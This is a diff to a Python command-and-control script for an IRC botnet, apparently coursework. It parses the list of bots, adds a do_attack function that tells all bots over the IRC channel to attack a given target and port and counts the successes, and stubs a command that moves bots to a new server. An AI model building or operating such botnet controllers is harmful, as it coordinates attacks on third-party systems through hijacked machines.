@@ -20,13 +20,50 @@ def do_status(client, args):
         try:
             data = client.recv(1024).decode('utf-8')
             print("A message from server:", data)
-            botList.append(data.split(':')[2].strip())
+            print('-------------------------------------------------------')
+            lines = data.split('\n')
+            print(lines)
+            print('-------------------------------------------------------')
+            for line in lines:
+                if line:
+                    botList.append(line.split(':')[2].strip())
         except socket.timeout:
             break
-    print(botList)
+    print('found '+ str(len(botList))+' bots: ', end='')
+    for bot in botList:
+        print(bot+', ', end='')
+    print()
+
+
 
 def do_attack(client, args):
     print("attack", args[1], args[2])
+    sendPrivMSG(channel, 'attack '+args[1]+' '+args[2])
+    attackList = []
+    client.settimeout(5)
+    while True:
+        try:
+            data = client.recv(1024).decode('utf-8')
+            print("A message from server:", data)
+            print('-------------------------------------------------------')
+            lines = data.split('\n')
+            print(lines)
+            print('-------------------------------------------------------')
+            for line in lines:
+                if line:
+                    attackList.append(line.split(':',2)[2].strip())
+        except socket.timeout:
+            break
+    success = 0
+    fail = 0
+    for attack in attackList:
+        if 'unsuccessful' in attack:
+            fail += 1
+        else:
+            success += 1
+        print(attack)
+    print('Total: '+ str(success) + ' successful, '+ str(fail) +' unsuccessful')
+
 
 def do_move(client, args):
     print("bots connect to the new IRC server")
